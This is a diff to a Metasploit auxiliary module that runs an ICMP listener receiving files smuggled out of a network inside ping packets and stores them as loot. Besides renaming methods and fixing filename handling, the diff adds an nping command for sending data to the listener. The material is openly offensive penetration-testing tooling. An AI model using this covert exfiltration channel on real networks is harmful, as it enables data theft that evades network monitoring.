@@ -27,14 +27,22 @@ class Metasploit3 < Msf::Auxiliary
 				specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or
 				a random filename can be assisnged). All data received from this source will automatically
 				be added to the receive buffer until an ICMP echo request containing a specific end trigger
-				(defaults to 'EOL') is received.
+				(defaults to '^EOL') is received.
+
+				Suggested Client:
+				Data can be sent from the client using a variety of tools. One such example is nping (included
+				with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string "BOFtest.txt" -c1
 			},
 			'Author'      => 'Chris John Riley',
 			'License'     => MSF_LICENSE,
 			'References'  =>
 				[
 					# packetfu
-					['URL','http://code.google.com/p/packetfu/']
+					['URL','http://code.google.com/p/packetfu/'],
+					# nping
+					['URL', 'http://nmap.org/book/nping-man.html'],
+					# simple icmp
+					['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
 				]
 		)
 
@@ -84,15 +92,15 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			# start icmp listener process - loop
-			icmplistener
+			icmp_listener
 
 		ensure
-			storefile
+			store_file
 			print_status("\nStopping ICMP listener on #{@interface} (#{@iface_ip})")
 		end
 	end
 
-	def icmplistener
+	def icmp_listener
 		# start icmp listener
 
 		print_status("ICMP Listener started on #{@interface} (#{@iface_ip}). Monitoring for trigger packet containing #{datastore['START_TRIGGER']}")
@@ -128,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 
 					if @record
 						print_error("New file started without saving old data")
-						storefile
+						store_file
 					end
 
 					# begin recording stream
@@ -136,11 +144,13 @@ class Metasploit3 < Msf::Auxiliary
 					@record_host = packet.ip_saddr
 					@record_data = ''
 
-					# set filename in packet or set random value
+					# set filename from data in incoming icmp packet
 					if datastore['FNAME_IN_PACKET']
-						@filename = data[((datastore['START_TRIGGER'].length)-1)..-1].strip # set filename from icmp payload
-					else
-						@filename = "icmp_exfil_" + ::Time.now.to_i # set random filename
+						@filename = data[((datastore['START_TRIGGER'].length)-1)..-1].strip
+					end
+					# if filename not sent in packet, or FNAME_IN_PACKET false set time based name
+					if not datastore['FNAME_IN_PACKET'] or @filename.empty?
+						@filename = "icmp_exfil_" + ::Time.now.to_i.to_s # set filename based on current time
 					end
 
 					print_good("Beginning capture of \"#{@filename}\" data")
@@ -162,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 						# end of file marker found
 						print_status("#{@record_data.length} bytes of data recevied in total")
 						print_good("End of File received. Saving \"#{@filename}\" to loot")
-						storefile
+						store_file
 
 						# create response packet icmp_pkt
 						icmp_response, contents = icmp_packet(packet, datastore['RESP_END'])
@@ -233,7 +243,7 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_good("Response sent to #{@dst_ip} containing response trigger : \"#{contents}\"")
 	end
 
-	def storefile
+	def store_file
 		# store the file in loot if data is present
 		if @record_data and not @record_data.empty?
 			loot = store_loot(
